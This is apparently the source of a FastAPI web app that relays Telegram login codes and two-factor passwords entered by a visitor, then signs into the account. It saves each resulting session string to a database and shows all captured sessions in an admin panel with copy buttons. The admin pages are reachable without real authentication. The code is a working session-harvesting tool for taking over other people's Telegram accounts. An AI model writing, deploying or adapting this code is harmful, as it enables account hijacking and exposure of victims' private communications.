import os
import sqlite3
from fastapi import FastAPI, Request, Form, HTTPException
from fastapi.responses import HTMLResponse, JSONResponse, RedirectResponse
from fastapi.templating import Jinja2Templates
from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError

app = FastAPI()
templates = Jinja2Templates(directory=".")

# === CONFIG ===
API_ID = int(os.getenv("API_ID"))
API_HASH = os.getenv("API_HASH")
ADMIN_PASS = os.getenv("ADMIN_PASSWORD", "admin123")  # CHANGE THIS!
DB = "sessions.db"

# === DATABASE ===
def init_db():
    conn = sqlite3.connect(DB)
    # pending: stores phone_code_hash after send_code
    conn.execute("""
    CREATE TABLE IF NOT EXISTS pending (
        phone TEXT PRIMARY KEY,
        hash TEXT,
        time TEXT
    )
    """)
    # sessions: final string sessions
    conn.execute("CREATE TABLE IF NOT EXISTS sessions (phone TEXT UNIQUE, session TEXT, time TEXT)")
    conn.close()

# Clear DB on first deploy (remove after)
if os.getenv("CLEAR_DB") == "1":
    if os.path.exists(DB):
        os.remove(DB)
    os.environ.pop("CLEAR_DB", None)

init_db()

# === DB HELPERS ===
def save_pending(phone: str, hash: str):
    conn = sqlite3.connect(DB)
    conn.execute("REPLACE INTO pending (phone, hash, time) VALUES (?, ?, datetime('now'))", (phone, hash))
    conn.commit()
    conn.close()

def get_pending(phone: str):
    conn = sqlite3.connect(DB)
    c = conn.cursor()
    c.execute("SELECT hash FROM pending WHERE phone = ?", (phone,))
    row = c.fetchone()
    conn.close()
    return row[0] if row else None

def delete_pending(phone: str):
    conn = sqlite3.connect(DB)
    conn.execute("DELETE FROM pending WHERE phone = ?", (phone,))
    conn.commit()
    conn.close()

def save_session(phone: str, session: str):
    conn = sqlite3.connect(DB)
    conn.execute("REPLACE INTO sessions (phone, session, time) VALUES (?, ?, datetime('now'))", (phone, session))
    conn.commit()
    conn.close()
    delete_pending(phone)  # cleanup

def delete_session(phone: str):
    conn = sqlite3.connect(DB)
    conn.execute("DELETE FROM sessions WHERE phone = ?", (phone,))
    conn.commit()
    conn.close()

# === ROUTES ===
@app.get("/", response_class=HTMLResponse)
async def home(request: Request):
    phone = request.query_params.get("phone")
    if not phone:
        raise HTTPException(400, "Phone required")
    # Clean old data
    delete_pending(phone)
    delete_session(phone)
    return templates.TemplateResponse("index.html", {"request": request, "phone": phone})

@app.post("/send")
async def send_code(phone: str = Form(...)):
    client = TelegramClient(StringSession(), API_ID, API_HASH)
    try:
        await client.connect()
        sent = await client.send_code_request(phone)
        save_pending(phone, sent.phone_code_hash)
        await client.disconnect()
        return JSONResponse({"ok": True, "hash": sent.phone_code_hash})
    except Exception as e:
        if client.is_connected():
            await client.disconnect()
        return JSONResponse({"error": str(e)})

@app.post("/verify")
async def verify(phone: str = Form(...), code: str = Form(...), pwd: str = Form("")):
    stored_hash = get_pending(phone)
    if not stored_hash:
        return JSONResponse({"error": "Session expired. Start over."})

    client = TelegramClient(StringSession(), API_ID, API_HASH)
    try:
        await client.connect()
        if pwd:
            await client.sign_in(phone, code, password=pwd, phone_code_hash=stored_hash)
        else:
            await client.sign_in(phone, code, phone_code_hash=stored_hash)
        session_str = client.session.save()
        await client.disconnect()
        save_session(phone, session_str)
        return JSONResponse({"session": session_str})
    except SessionPasswordNeededError:
        return JSONResponse({"needs_password": True})
    except PhoneCodeInvalidError:
        return JSONResponse({"error": "Wrong code"})
    except Exception as e:
        return JSONResponse({"error": str(e)})
    finally:
        if client.is_connected():
            await client.disconnect()

# === ADMIN PANEL ===
@app.get("/admin")
async def admin_login():
    return HTMLResponse("""
    <form method="post" style="max-width:400px;margin:2rem auto;padding:1rem;text-align:center;">
      <h2>Admin Login</h2>
      <input type="password" name="password" placeholder="Enter password" required 
             style="width:100%;padding:0.8rem;margin:0.5rem 0;border:1px solid #ddd;border-radius:8px;font-size:1rem;">
      <button type="submit" 
              style="width:100%;padding:0.8rem;background:#1a73e8;color:white;border:none;border-radius:8px;font-weight:bold;">Login</button>
    </form>
    """)

@app.post("/admin")
async def admin_check(password: str = Form(...)):
    if password != ADMIN_PASS:
        raise HTTPException(403, "Wrong password")
    return RedirectResponse("/admin/sessions", status_code=303)

@app.get("/admin/sessions", response_class=HTMLResponse)
async def admin_sessions():
    conn = sqlite3.connect(DB)
    c = conn.cursor()
    c.execute("SELECT phone, session, time FROM sessions ORDER BY time DESC")
    rows = c.fetchall()
    conn.close()

    html = """
    <div style="max-width:700px;margin:2rem auto;font-family:Arial;">
      <h2 style="text-align:center;color:#1a73e8;">Admin Panel - Sessions</h2>
      <div style="background:#f0f4f8;padding:1rem;border-radius:10px;margin-bottom:1rem;">
        <b>Total Sessions:</b> {count}
      </div>
    """.format(count=len(rows))

    if rows:
        html += "<ol style='padding-left:1.2rem;'>"
        for r in rows:
            html += f"""
            <li style='margin:1.5rem 0;padding:1.2rem;background:#fff;border-radius:12px;box-shadow:0 2px 10px rgba(0,0,0,0.05);'>
                <div><b>Phone:</b> <code>{r[0]}</code></div>
                <div><b>Time:</b> {r[2]}</div>
                <textarea style='width:100%;height:90px;font-family:monospace;font-size:0.8rem;margin:0.5rem 0;padding:0.6rem;
                                border:1px solid #ddd;border-radius:8px;background:#f8f9fa;resize:none;'>{r[1]}</textarea>
                <div style="display:flex;gap:0.5rem;">
                    <button onclick='navigator.clipboard.writeText(this.parentElement.previousElementSibling.value);alert(\"Copied!\")'
                            style='flex:1;padding:0.6rem;background:#0f9d58;color:white;border:none;border-radius:6px;font-weight:bold;cursor:pointer;'>
                        Copy String
                    </button>
                    <a href='/admin/delete?phone={r[0]}' 
                       style='flex:1;padding:0.6rem;background:#d93025;color:white;text-align:center;border-radius:6px;text-decoration:none;font-weight:bold;'>
                        Delete
                    </a>
                </div>
            </li>
            """
        html += "</ol>"
    else:
        html += "<p style='text-align:center;color:#666;'>No sessions yet.</p>"

    html += """
      <div style="text-align:center;margin:2rem 0;">
        <a href='/admin' style="color:#1a73e8;text-decoration:none;">← Logout</a>
      </div>
    </div>
    """
    return HTMLResponse(html)

@app.get("/admin/delete")
async def delete(phone: str):
    delete_session(phone)
    return RedirectResponse("/admin/sessions")
